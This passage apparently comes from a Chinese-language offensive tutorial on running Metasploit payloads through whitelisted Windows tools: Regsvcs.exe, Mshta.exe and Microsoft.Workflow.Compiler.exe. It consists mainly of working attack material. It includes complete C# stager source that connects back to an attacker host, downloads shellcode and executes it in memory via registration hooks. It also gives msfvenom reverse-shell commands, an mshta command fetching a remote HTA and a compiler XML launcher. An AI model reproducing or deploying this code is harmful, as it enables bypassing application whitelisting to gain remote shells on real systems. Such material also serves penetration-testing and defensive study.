Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>MkHUcy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cyDiPLJhiAQbw<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> cyDiPLJhiAQbw<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> cyDiPLJhiAQbw<span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ZFeAPdN</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> hjErkNfmkyBq<span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>hjErkNfmkyBq <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>

UInt32 xYfliOUgksPsv <span class="token operator">=</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token number">0x00040000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>hjErkNfmkyBq<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

UInt32 eSiulXLtqQO <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>xYfliOUgksPsv<span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>hjErkNfmkyBq<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>eSiulXLtqQO<span class="token punctuation">,</span> hjErkNfmkyBq<span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>hjErkNfmkyBq<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

UInt32 NByrFgKjVjB <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

IntPtr PsIqQCvc <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> eSiulXLtqQO<span class="token punctuation">,</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref NByrFgKjVjB<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>PsIqQCvc<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> 

public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BBNSohgZXGCaD</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> cyDiPLJhiAQbw <span class="token operator">=</span> null<span class="token punctuation">;</span> cyDiPLJhiAQbw <span class="token operator">=</span> <span class="token function">SVMBrK</span><span class="token punctuation">(</span><span class="token string">"192.168.1.4"</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">ZFeAPdN</span><span class="token punctuation">(</span>cyDiPLJhiAQbw<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>
</code></pre>
<hr>
<h2><a id="114_Regsvcsexepayload_453"></a>11.4 基于白名单Regsvcs.exe执行payload（四）</h2>
<p><strong>Regsvcs简介：</strong></p>
<p>Regsvcs为.NET服务安装工具，主要提供三类服务：</p>
<pre><code class="prism language-c">加载并注册程序集。
  
生成、注册类型库并将其安装到指定的 COM<span class="token operator">+</span> <span class="token number">1.0</span> 应用程序中。  

配置以编程方式添加到类的服务。  
</code></pre>
<p>说明：Regsvcs.exe所在路径没有被系统添加PATH环境变量中，因此，Regsvcs命令无法识别。</p>
<p><strong>具体参考微软官方文档：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>us<span class="token operator">/</span>dotnet<span class="token operator">/</span>framework<span class="token operator">/</span>tools<span class="token operator">/</span>regsvcs<span class="token operator">-</span>exe<span class="token operator">-</span>net<span class="token operator">-</span>services<span class="token operator">-</span>installation<span class="token operator">-</span>tool
</code></pre>
<p><strong>基于白名单Regsvcs.exe配置payload：</strong></p>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\regsvcs<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian</p>
<p>靶机：192.168.1.3 Windows 7<br>
配置攻击机msf：<br>
<img src="https://img-blog.csdnimg.cn/20201009225817242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\regsvcs<span class="token punctuation">.</span>exe Micropoor<span class="token punctuation">.</span>dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009225828215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009225833377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>附录：Micropoor.cs<br>
注：x86 payload</p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Linq<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Threading<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>EnterpriseServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span>

namespace phwUqeuTRSqn

<span class="token punctuation">{</span>

public class mfBxqerbXgh <span class="token punctuation">:</span> ServicedComponent <span class="token punctuation">{</span> 

public <span class="token function">mfBxqerbXgh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"Micropoor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 

<span class="token punctuation">[</span>ComRegisterFunction<span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> RegisterClass <span class="token punctuation">(</span> string DssjWsFMnwwXL <span class="token punctuation">)</span>

<span class="token punctuation">{</span>

uXsiCEXRzLNkI<span class="token punctuation">.</span><span class="token function">BBNSohgZXGCaD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> 

<span class="token punctuation">[</span>ComUnregisterFunction<span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> UnRegisterClass <span class="token punctuation">(</span> string DssjWsFMnwwXL <span class="token punctuation">)</span>

<span class="token punctuation">{</span>

 uXsiCEXRzLNkI<span class="token punctuation">.</span><span class="token function">BBNSohgZXGCaD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span> 

public class uXsiCEXRzLNkI

<span class="token punctuation">{</span> <span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">HeapCreate</span><span class="token punctuation">(</span>UInt32 pAyHWx<span class="token punctuation">,</span> UInt32 KXNJUcPIUymFNbJ<span class="token punctuation">,</span> UInt32 MotkftcMAIJRnW<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>UInt32 yjmmncJHBrUu<span class="token punctuation">,</span> UInt32 MYjktCDxYrlTs<span class="token punctuation">,</span> UInt32 zyBAwQVBQbi<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>UInt32 PorEiXBhZkA<span class="token punctuation">,</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> UIkcqF<span class="token punctuation">,</span> UInt32 wAXQEPCIVJQQb<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span>UInt32 WNvQyYv<span class="token punctuation">,</span> UInt32 vePRog<span class="token punctuation">,</span> UInt32 Bwxjth<span class="token punctuation">,</span> IntPtr ExkSdsTdwD<span class="token punctuation">,</span> UInt32 KfNaMFOJVTSxbrR<span class="token punctuation">,</span> ref UInt32 QEuyYka<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>IntPtr pzymHg<span class="token punctuation">,</span> UInt32 lReJrqjtOqvkXk<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">SVMBrK</span><span class="token punctuation">(</span>string MKwSjIxqTxxEO<span class="token punctuation">,</span> <span class="token keyword">int</span> jVaXWRxcmw<span class="token punctuation">)</span> <span class="token punctuation">{</span>

IPEndPoint hqbNYMZQr <span class="token operator">=</span> new <span class="token function">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>MKwSjIxqTxxEO<span class="token punctuation">)</span><span class="token punctuation">,</span> jVaXWRxcmw<span class="token punctuation">)</span><span class="token punctuation">;</span>

Socket LbLgipot <span class="token operator">=</span> new <span class="token function">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span><span class="token punctuation">;</span>

try <span class="token punctuation">{</span> LbLgipot<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>hqbNYMZQr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

catch <span class="token punctuation">{</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> VKQsLPgLmVdp <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

LbLgipot<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>VKQsLPgLmVdp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> jbQtneZFbvzK <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>VKQsLPgLmVdp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> cyDiPLJhiAQbw <span class="token operator">=</span> new byte<span class="token punctuation">[</span>jbQtneZFbvzK <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> vyPloXEDJoylLbj <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span>vyPloXEDJoylLbj <span class="token operator">&lt;</span> jbQtneZFbvzK<span class="token punctuation">)</span>

 <span class="token punctuation">{</span> vyPloXEDJoylLbj <span class="token operator">+</span><span class="token operator">=</span> LbLgipot<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>cyDiPLJhiAQbw<span class="token punctuation">,</span> vyPloXEDJoylLbj <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>jbQtneZFbvzK ‐ vyPloXEDJoylLbj<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span> <span class="token operator">?</span> <span class="token punctuation">(</span>jbQtneZFbvzK ‐ vyPloXEDJoylLbj<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> MkHUcy <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>LbLgipot<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>MkHUcy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cyDiPLJhiAQbw<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> cyDiPLJhiAQbw<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> cyDiPLJhiAQbw<span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ZFeAPdN</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> hjErkNfmkyBq<span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>hjErkNfmkyBq <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>

UInt32 xYfliOUgksPsv <span class="token operator">=</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token number">0x00040000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>hjErkNfmkyBq<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

UInt32 eSiulXLtqQO <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>xYfliOUgksPsv<span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>hjErkNfmkyBq<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>eSiulXLtqQO<span class="token punctuation">,</span> hjErkNfmkyBq<span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>hjErkNfmkyBq<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

UInt32 NByrFgKjVjB <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

IntPtr PsIqQCvc <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> eSiulXLtqQO<span class="token punctuation">,</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref NByrFgKjVjB<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>PsIqQCvc<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> 

public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BBNSohgZXGCaD</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> cyDiPLJhiAQbw <span class="token operator">=</span> null<span class="token punctuation">;</span> cyDiPLJhiAQbw <span class="token operator">=</span> <span class="token function">SVMBrK</span><span class="token punctuation">(</span><span class="token string">"192.168.1.4"</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">ZFeAPdN</span><span class="token punctuation">(</span>cyDiPLJhiAQbw<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>
</code></pre>
<hr>
<h2><a id="115_MshtaexepayloaddayuTwentyfourth_days_597"></a>11.5 基于白名单Mshta.exe执行payload（五）（dayu-Twenty-fourth days）</h2>
<p><strong>Mshta简介：</strong></p>
<p>Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。</p>
<p>说明：Mshta所在路径已被系统添加PATH环境变量中，因此，可直接执行Mshta.exe命令。</p>
<p>基于白名单Mshta.exe配置payload：</p>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\mshta<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\mshta<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian</p>
<p>靶机： 192.168.1.3 Windows 7</p>
<p><strong>配置攻击机msf：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201010151135711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
配置payload：</p>
<pre><code class="prism language-c">msfvenom ‐a x86 ‐‐platform windows ‐p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐f raw <span class="token operator">&gt;</span> shellcode<span class="token punctuation">.</span>bin
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010151201373.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">cat shellcode<span class="token punctuation">.</span>bin <span class="token operator">|</span>base64 ‐w <span class="token number">0</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010151210645.png#pic_center" alt="在这里插入图片描述"></p>
<p>替换如下：<img src="https://img-blog.csdnimg.cn/20201010151218228.png#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<pre><code class="prism language-c">mshta<span class="token punctuation">.</span>exe http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token operator">/</span>Micropoor<span class="token punctuation">.</span>hta
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010151244520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>附录：Micropoor.hta</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>mdsecactivebreach<span class="token operator">/</span>CACTUSTORCH<span class="token operator">/</span>master<span class="token operator">/</span>CACTUSTORCH<span class="token punctuation">.</span>hta
</code></pre>
<hr>
<h2><a id="116_Compilerexepayload_646"></a>11.6 基于白名单Compiler.exe执行payload（六）</h2>
<p>说明：Microsoft.Workflow.Compiler.exe所在路径没有被系统添加PATH环境变量中，因此，Microsoft.Workflow.Compiler命令无法识别。</p>
<p><strong>基于白名单Microsoft.Workflow.Compiler.exe配置payload：</strong></p>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\Microsoft<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Compiler<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\Microsoft<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Compiler<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian<br>
靶机：192.168.1.3 Windows 7</p>
<p><strong>配置攻击机msf：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201010151518329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>靶机执行：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\Microsoft<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Compiler<span class="token punctuation">.</span>exe poc<span class="token punctuation">.</span>xml Micropoor<span class="token punctuation">.</span>tcp
</code></pre>
<p><strong>结合meterpreter：</strong></p>
<p>注：payload.cs需要用到System.Workflow.Activities</p>
<p><strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\Microsoft<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Compiler<span class="token punctuation">.</span>exe poc<span class="token punctuation">.</span>xml Micropoor_rev1<span class="token punctuation">.</span>cs
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010151545967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020101015155667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>结合meterpreter：</strong></p>
<p>注：payload.cs需要用到System.Workflow.Activities<br>
<strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\Microsoft<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Compiler<span class="token punctuation">.</span>exe poc<span class="token punctuation">.</span>xml Micropoor_rev1<span class="token punctuation">.</span>cs
</code></pre>
<p><strong>配置攻击机msf：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201010151642733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>payload生成：</strong></p>
<pre><code class="prism language-c">msfvenom ‐p windows<span class="token operator">/</span>x64<span class="token operator">/</span>shell<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐ f csharp
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101015170632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>附录：poc.xml</strong><br>
注：windows/shell/reverse_tcp</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf‐8"</span><span class="token operator">?</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>CompilerInput xmlns<span class="token punctuation">:</span>i<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/XMLSchema‐instance"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"</span>

<span class="token operator">&lt;</span>files xmlns<span class="token punctuation">:</span>d2p1<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>string<span class="token operator">&gt;</span>Micropoor<span class="token punctuation">.</span>tcp<span class="token operator">&lt;</span><span class="token operator">/</span>d2p1<span class="token punctuation">:</span>string<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>files<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>parameters xmlns<span class="token punctuation">:</span>d2p1<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>assemblyNames xmlns<span class="token punctuation">:</span>d3p1<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>compilerOptions i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>coreAssemblyFileName xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>coreAssemblyFileName<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>embeddedResources xmlns<span class="token punctuation">:</span>d3p1<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>evidence xmlns<span class="token punctuation">:</span>d3p1<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.Security.Policy"</span> i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

